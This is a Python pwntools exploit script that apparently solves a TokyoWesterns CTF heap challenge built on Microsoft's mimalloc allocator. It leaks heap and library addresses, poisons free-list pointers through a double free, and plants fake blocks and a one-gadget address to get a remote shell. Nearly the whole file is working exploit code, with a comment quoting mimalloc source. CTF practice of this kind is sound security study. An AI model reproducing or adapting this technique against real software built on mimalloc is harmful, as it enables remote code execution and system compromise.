#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

host = "10.211.55.19"
port = 8888
host = "mi.chal.ctf.westerns.tokyo"
port = 10001
context.arch = "amd64"    
r = remote(host,port)

def alloc(idx,size):
    r.recvuntil(">>")
    r.sendline("1")
    r.recvuntil("number")
    r.sendline(str(idx))
    r.recvuntil("size")
    r.sendline(str(size))

def write(idx,data):
    r.recvuntil(">>")
    r.sendline("2")
    r.recvuntil("number")
    r.sendline(str(idx))
    r.recvuntil("value")
    r.send(data)

def read(idx):
    r.recvuntil(">>")
    r.sendline("3")
    r.recvuntil("number")
    r.sendline(str(idx))

def free(idx):
    r.recvuntil(">>")
    r.sendline("4")
    r.recvuntil("number")
    r.sendline(str(idx))



alloc(0,0x40)
alloc(0,0x40)
write(0,'a'*0x40)
read(0)
r.recvuntil("a"*0x40)
heap = u64(r.recvuntil("\n")[:-1].ljust(8,"\x00")) - 0x1740
print "heap:",hex(heap) 
for i in range(60):
    if i == 0 :
        alloc(6,0x40)
    elif i == 1  :
        alloc(7,0x40)
    else :
        alloc(0,0x40)

alloc(1,0x40)
free(0)
free(0)
write(0,p64(heap+0x70) + 'b'*0x38)
alloc(2,0x40)
alloc(3,0x40-8)
alloc(3,0x40-8)

write(3,'a'*0x38)
read(3)
r.recvuntil("a"*0x38)
mimalloc_heap = u64(r.recvuntil("\n")[:-1].ljust(8,"\x00"))
mimalloc = mimalloc_heap - 0x2233c0
print "mimalloc:",hex(mimalloc)
libc = mimalloc + 0x22a000
print "libc:",hex(libc)
fake1 = heap+0x1700
fake2 = heap + 0x1740
defer = mimalloc +0x228970
magic = libc + 0x4f322
#https://github.com/microsoft/mimalloc/blob/master///src/page.c#L163
#  while ((next = mi_block_next(page,tail)) != NULL) {
#    count++;
#    tail = next;
#  }
#
#  // and prepend to the free list
#  mi_block_set_next(page,tail, page->free);
#
#
write(6,p64(fake2) + "\x00"*0x38)
write(7,p64(defer) + "\x00"*0x38)
write(3,p64(0) + p64(0xdeadbeef) + p64(0x40) + p64(magic)+ p64(0)+ p64(fake1) + p64(0x40))

alloc(0,0x40)
alloc(0,0)
r.interactive()
